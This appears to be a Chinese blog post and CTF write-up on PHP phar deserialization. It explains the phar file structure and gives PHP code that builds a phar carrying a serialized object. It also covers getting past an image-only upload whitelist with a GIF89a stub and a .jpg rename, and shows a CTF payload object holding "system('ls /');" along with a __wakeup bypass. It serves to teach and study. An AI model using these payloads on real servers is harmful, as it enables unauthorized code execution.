---
layout: post
title: phar反序列化
categories: [web,php,phar]
---
# phar

## 首先了解一下phar://伪协议

phar://伪协议读取zip压缩包文件内容，将木马压缩成压缩包‘

> ?file=phar://压缩包名/内部文件名

## 进入正题phar反序列化

### stub: 

phar文件的标识，以`xxxxx<?php xxx; __HALT_COMPILER();?>`为固定格式，前面的可以不管，但是必须得以`__HALT_COMPLIER();`结尾

### a manifest describing the contents:

Phar文件中被压缩的文件的一些信息以及压缩文件的权限，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点,我们构造的exp就放在这个部分内。

### the file contents:

这里放的是压缩文件内的内容，我们真正的目的是构造exp利用phar反序列化，所以这里的内容可以随便写，并不影响。

### a signature for verifying Phar integrity:

签名。放在最末，算是一个匹配符，将前面除了签名用SHA1、MD5或SHA256加密所有的内容后来匹配。在这里可能用不上，但是在phar反序列化配上GC回收机制的时候这个点会派上大用场。

### 写个Demo

```php
<?php
highlight_file(__FILE__);
class Test{
    public $name='errorr0';
}
$a = new Test();
$phar = new Phar("errorr0.phar");  //生成一个phar文件，名字任意这里是errorr0，后缀名必须为phar
$phar -> startBuffering(); 
$phar -> setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar -> setMetadata($a); //将创建的对象a写入到Metadata中
$phar -> addFromString("test.txt","hello,phar!!"); //添加压缩文件 文件名为test，文件内容为hello,phar!!
$phar -> stopBuffering();
?>
```

<br/>

### tip

如果题目是白名单绕过，只能上传jpg、png、gif。这个时候应该怎么办呢？还记得我说过gif是以GIF89a开头的吧？所以解决方法就是，在setStub加phar的标识时顺便加上一句GIF89a，再将生成的phar文件修改为JPG后缀，最后上传再用phar://协议就可以了。

<br/>

<br/>

## 例：[NSSRound#4 SWPU]1zweb

```php
<?php
class LoveNss{
    public $ljt="Misc";
    public $dky="Re";
    public $cmd="system('ls /');";
}
 
$a = new LoveNss();
 
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //自定义的meta-data
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算,默认是SHA1
$phar->stopBuffering();
```

生成phar文件，要绕过__wakeup方法，手动修改反序列化的数量

### 记得修改php.ini. 我就懒得改了
